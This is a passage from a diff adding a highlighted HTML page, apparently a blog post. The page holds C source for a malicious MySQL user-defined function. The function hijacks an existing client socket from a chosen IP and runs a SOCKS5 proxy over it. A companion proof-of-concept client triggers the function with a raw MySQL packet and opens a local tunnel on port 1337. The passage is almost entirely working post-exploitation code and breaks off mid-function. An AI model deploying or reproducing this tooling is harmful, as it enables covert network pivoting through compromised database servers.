+			<span class="n">left</span> <span class="o">-=</span> <span class="n">nread</span><span class="p">;</span>
+			<span class="n">buf</span> <span class="o">+=</span> <span class="n">nread</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="n">n</span><span class="p">;</span>
+<span class="p">}</span>
+
+
+<span class="kt">void</span> <span class="nf">socks5_invitation</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">char</span> <span class="n">init</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+	<span class="n">readn</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">init</span><span class="p">,</span> <span class="n">ARRAY_SIZE</span><span class="p">(</span><span class="n">init</span><span class="p">));</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">init</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="n">VERSION</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">socks5_auth</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span> <span class="p">{</span>
+		<span class="kt">char</span> <span class="n">answer</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="n">VERSION</span><span class="p">,</span> <span class="n">NOAUTH</span> <span class="p">};</span>
+		<span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">answer</span><span class="p">,</span> <span class="n">ARRAY_SIZE</span><span class="p">(</span><span class="n">answer</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">socks5_command</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="kt">char</span> <span class="n">command</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
+	<span class="n">readn</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">command</span><span class="p">,</span> <span class="n">ARRAY_SIZE</span><span class="p">(</span><span class="n">command</span><span class="p">));</span>
+	<span class="k">return</span> <span class="n">command</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="kt">char</span> <span class="o">*</span><span class="nf">socks5_ip_read</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="kt">char</span> <span class="o">*</span><span class="n">ip</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="o">*</span> <span class="n">IPSIZE</span><span class="p">);</span>
+	<span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="p">)</span><span class="n">ip</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span> <span class="c1">//Buggy</span>
+	<span class="n">readn</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">ip</span><span class="p">,</span> <span class="n">IPSIZE</span><span class="p">);</span>
+	<span class="k">return</span> <span class="n">ip</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">unsigned</span> <span class="kt">short</span> <span class="kt">int</span> <span class="nf">socks5_read_port</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="kt">unsigned</span> <span class="kt">short</span> <span class="kt">int</span> <span class="n">p</span><span class="p">;</span>
+	<span class="n">readn</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">p</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">p</span><span class="p">));</span>
+	<span class="k">return</span> <span class="n">p</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">app_connect</span><span class="p">(</span><span class="kt">int</span> <span class="n">type</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">short</span> <span class="kt">int</span> <span class="n">portnum</span><span class="p">,</span> <span class="kt">int</span> <span class="n">orig</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">int</span> <span class="n">new_fd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">remote</span><span class="p">;</span>
+	<span class="kt">char</span> <span class="n">address</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+
+	<span class="n">memset</span><span class="p">(</span><span class="n">address</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="n">ARRAY_SIZE</span><span class="p">(</span><span class="n">address</span><span class="p">));</span>
+	<span class="n">new_fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">type</span> <span class="o">==</span> <span class="n">IP</span><span class="p">)</span> <span class="p">{</span>
+		<span class="kt">char</span> <span class="o">*</span><span class="n">ip</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+		<span class="n">ip</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
+		<span class="n">snprintf</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">ARRAY_SIZE</span><span class="p">(</span><span class="n">address</span><span class="p">),</span> <span class="s">"%hhu.%hhu.%hhu.%hhu"</span><span class="p">,</span><span class="n">ip</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">ip</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">ip</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">ip</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
+		<span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">remote</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">remote</span><span class="p">));</span>
+		<span class="n">remote</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+		<span class="n">remote</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">address</span><span class="p">);</span>
+		<span class="n">remote</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">portnum</span><span class="p">);</span>
+
+		<span class="k">if</span> <span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">new_fd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">remote</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">remote</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+		<span class="p">}</span>
+		<span class="k">return</span> <span class="n">new_fd</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">socks5_ip_send_response</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ip</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">short</span> <span class="kt">int</span> <span class="n">port</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="kt">char</span> <span class="n">response</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="n">VERSION</span><span class="p">,</span> <span class="n">OK</span><span class="p">,</span> <span class="n">RESERVED</span><span class="p">,</span> <span class="n">IP</span> <span class="p">};</span>
+	<span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">response</span><span class="p">,</span> <span class="n">ARRAY_SIZE</span><span class="p">(</span><span class="n">response</span><span class="p">));</span>
+	<span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">ip</span><span class="p">,</span> <span class="n">IPSIZE</span><span class="p">);</span>
+	<span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">port</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">port</span><span class="p">));</span>
+<span class="p">}</span>
+
+
+<span class="kt">void</span> <span class="nf">app_socket_pipe</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd0</span><span class="p">,</span> <span class="kt">int</span> <span class="n">fd1</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="kt">int</span> <span class="n">maxfd</span><span class="p">,</span> <span class="n">ret</span><span class="p">;</span>
+	<span class="n">fd_set</span> <span class="n">rd_set</span><span class="p">;</span>
+	<span class="kt">size_t</span> <span class="n">nread</span><span class="p">;</span>
+	<span class="kt">char</span> <span class="n">buffer_r</span><span class="p">[</span><span class="n">BUFSIZE</span><span class="p">];</span>
+
+	<span class="n">maxfd</span> <span class="o">=</span> <span class="p">(</span><span class="n">fd0</span> <span class="o">&gt;</span> <span class="n">fd1</span><span class="p">)</span> <span class="o">?</span> <span class="n">fd0</span> <span class="o">:</span> <span class="n">fd1</span><span class="p">;</span>
+	<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">FD_ZERO</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rd_set</span><span class="p">);</span>
+		<span class="n">FD_SET</span><span class="p">(</span><span class="n">fd0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rd_set</span><span class="p">);</span>
+		<span class="n">FD_SET</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rd_set</span><span class="p">);</span>
+		<span class="n">ret</span> <span class="o">=</span> <span class="n">select</span><span class="p">(</span><span class="n">maxfd</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rd_set</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+		<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">errno</span> <span class="o">==</span> <span class="n">EINTR</span><span class="p">)</span> <span class="p">{</span>
+			<span class="k">continue</span><span class="p">;</span>
+		<span class="p">}</span>
+
+		<span class="k">if</span> <span class="p">(</span><span class="n">FD_ISSET</span><span class="p">(</span><span class="n">fd0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rd_set</span><span class="p">))</span> <span class="p">{</span>
+			<span class="n">nread</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span><span class="n">fd0</span><span class="p">,</span> <span class="n">buffer_r</span><span class="p">,</span> <span class="n">BUFSIZE</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+			<span class="k">if</span> <span class="p">(</span><span class="n">nread</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
+				<span class="k">break</span><span class="p">;</span>
+			<span class="n">send</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">buffer_r</span><span class="p">,</span> <span class="n">nread</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+		<span class="p">}</span>
+
+		<span class="k">if</span> <span class="p">(</span><span class="n">FD_ISSET</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rd_set</span><span class="p">))</span> <span class="p">{</span>
+			<span class="n">nread</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="n">buffer_r</span><span class="p">,</span> <span class="n">BUFSIZE</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+			<span class="k">if</span> <span class="p">(</span><span class="n">nread</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
+				<span class="k">break</span><span class="p">;</span>
+			<span class="n">send</span><span class="p">(</span><span class="n">fd0</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">buffer_r</span><span class="p">,</span> <span class="n">nread</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="o">*</span><span class="nf">worker</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">int</span> <span class="n">inet_fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+	<span class="kt">int</span> <span class="n">command</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">short</span> <span class="kt">int</span> <span class="n">p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">socks5_invitation</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+	<span class="n">socks5_auth</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+	<span class="n">command</span> <span class="o">=</span> <span class="n">socks5_command</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">command</span> <span class="o">==</span> <span class="n">IP</span><span class="p">)</span> <span class="p">{</span>
+		<span class="kt">char</span> <span class="o">*</span><span class="n">ip</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+		<span class="n">ip</span> <span class="o">=</span> <span class="n">socks5_ip_read</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+		<span class="n">p</span> <span class="o">=</span> <span class="n">socks5_read_port</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+		<span class="n">inet_fd</span> <span class="o">=</span> <span class="n">app_connect</span><span class="p">(</span><span class="n">IP</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">ip</span><span class="p">,</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">p</span><span class="p">),</span> <span class="n">fd</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">inet_fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+			<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+		<span class="p">}</span>
+		<span class="n">socks5_ip_send_response</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
+		<span class="n">free</span><span class="p">(</span><span class="n">ip</span><span class="p">);</span>
+    <span class="p">}</span> 
+
+	<span class="n">app_socket_pipe</span><span class="p">(</span><span class="n">inet_fd</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
+	<span class="n">close</span><span class="p">(</span><span class="n">inet_fd</span><span class="p">);</span>
+	<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+
+
+
+
+<span class="kt">void</span> <span class="nf">proxy</span><span class="p">(</span><span class="kt">int</span> <span class="n">socks</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">char</span> <span class="n">a</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+	<span class="n">write</span><span class="p">(</span><span class="n">socks</span><span class="p">,</span> <span class="s">"And this is my Child</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="s">"And this is my Child</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+	<span class="n">read</span><span class="p">(</span><span class="n">socks</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">a</span><span class="p">));</span> <span class="c1">// </span>
+	<span class="n">worker</span><span class="p">(</span><span class="n">socks</span><span class="p">);</span>
+	<span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+ 
+<span class="kt">int</span> <span class="nf">do_carracha</span><span class="p">(</span><span class="n">UDF_INIT</span> <span class="o">*</span><span class="n">initid</span><span class="p">,</span> <span class="n">UDF_ARGS</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">is_null</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">error</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">arg_count</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="k">return</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+	
+	<span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">ret</span><span class="p">,</span> <span class="n">pid</span><span class="p">;</span>
+ 	<span class="k">struct</span> <span class="n">sockaddr_storage</span> <span class="n">client_addr</span><span class="p">;</span>
+	<span class="n">socklen_t</span> <span class="n">addr_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">client_addr</span><span class="p">);</span>
+
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_UNIX</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+	<span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">fd</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">ret</span> <span class="o">=</span> <span class="n">getpeername</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">client_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addr_size</span><span class="p">);</span>
+			<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+				<span class="kt">char</span> <span class="n">ip</span><span class="p">[</span><span class="n">INET6_ADDRSTRLEN</span><span class="p">];</span>
+			
+				<span class="k">if</span> <span class="p">(</span><span class="n">client_addr</span><span class="p">.</span><span class="n">ss_family</span> <span class="o">==</span> <span class="n">AF_INET</span><span class="p">)</span> <span class="p">{</span>
+					<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">client_addr</span><span class="p">;</span>
+					<span class="n">inet_ntop</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">sin_addr</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ip</span><span class="p">));</span>
+				<span class="p">}</span>
+				<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">client_addr</span><span class="p">.</span><span class="n">ss_family</span> <span class="o">==</span> <span class="n">AF_INET6</span><span class="p">)</span> <span class="p">{</span>
+					<span class="k">struct</span> <span class="n">sockaddr_in6</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in6</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">client_addr</span><span class="p">;</span>
+					<span class="n">inet_ntop</span><span class="p">(</span><span class="n">AF_INET6</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">sin6_addr</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ip</span><span class="p">));</span>
+				<span class="p">}</span>
+
+				<span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="s">"X.X.X.X"</span><span class="p">))</span> <span class="p">{</span>
+					<span class="n">write</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="s">"Now I am become Death</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="s">"Now I am become Death</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+					<span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+					<span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+						<span class="n">proxy</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+						<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>	
+					<span class="p">}</span>	
+					<span class="k">else</span> <span class="p">{</span>
+						<span class="n">close</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+						<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+					<span class="p">}</span>
+				<span class="p">}</span> 
+		<span class="p">}</span>
+		<span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">client_addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">client_addr</span><span class="p">));</span>
+	<span class="p">}</span>
+ 	<span class="k">return</span> <span class="n">fd</span><span class="p">;</span>
+    
+<span class="p">}</span>
+ 
+<span class="kt">char</span> <span class="nf">do_carracha_init</span><span class="p">(</span><span class="n">UDF_INIT</span> <span class="o">*</span><span class="n">initid</span><span class="p">,</span> <span class="n">UDF_ARGS</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">message</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">return</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// PoC to communicate proxychains and SOCKS5 </span>
+<span class="cp">#include</span> <span class="cpf">&lt;my_global.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;mysql.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/time.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;netinet/ip.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span>
+
+
+<span class="kt">void</span> <span class="nf">proxy_init</span><span class="p">(</span><span class="kt">int</span> <span class="n">sock</span><span class="p">){</span>
+	<span class="n">fd_set</span> <span class="n">readset</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">timeval</span> <span class="n">tv</span><span class="p">;</span>
+	<span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">retval</span><span class="p">,</span> <span class="n">nread</span><span class="p">,</span> <span class="n">localfd</span><span class="p">,</span> <span class="n">clientlen</span><span class="p">,</span> <span class="n">sr</span><span class="p">,</span> <span class="n">maxfd</span><span class="p">,</span> <span class="n">select_fd</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+	<span class="kt">char</span> <span class="n">test</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+	<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">server</span><span class="p">,</span> <span class="n">client</span><span class="p">;</span>
+	<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[ SERVER BANNER ]</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="n">write</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s">"</span><span class="se">\31\x00\x00\00\x03</span><span class="s">select do_carracha('a');"</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
+
+	<span class="n">select_fd</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">sock</span><span class="p">;</span>
+	<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span><span class="n">https</span><span class="o">:</span><span class="c1">//nets.ec/Shellcode/Socket-reuse</span>
+		<span class="n">FD_ZERO</span><span class="p">(</span><span class="o">&amp;</span><span class="n">readset</span><span class="p">);</span>
+		<span class="n">FD_SET</span><span class="p">(</span><span class="n">select_fd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">readset</span><span class="p">);</span>
+		<span class="n">tv</span><span class="p">.</span><span class="n">tv_sec</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+		<span class="n">tv</span><span class="p">.</span><span class="n">tv_usec</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+		<span class="n">retval</span> <span class="o">=</span> <span class="n">select</span><span class="p">(</span><span class="n">select_fd</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">readset</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tv</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">retval</span><span class="p">)</span> <span class="p">{</span>
+			<span class="n">nread</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">select_fd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">test</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">test</span><span class="p">));</span>
+			<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"%s"</span><span class="p">,</span> <span class="n">test</span><span class="p">);</span>
+			<span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">test</span><span class="p">,</span> <span class="s">"Child"</span><span class="p">))</span> <span class="p">{</span>
+				<span class="k">break</span><span class="p">;</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+
+	<span class="k">if</span> <span class="p">((</span><span class="n">localfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">ERROR: could not open new socket!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+	
+
+	<span class="n">server</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+	<span class="n">server</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">1337</span><span class="p">);</span>
+	<span class="n">server</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span> 
+
+	<span class="k">if</span> <span class="p">(</span><span class="n">bind</span><span class="p">(</span><span class="n">localfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">server</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">server</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
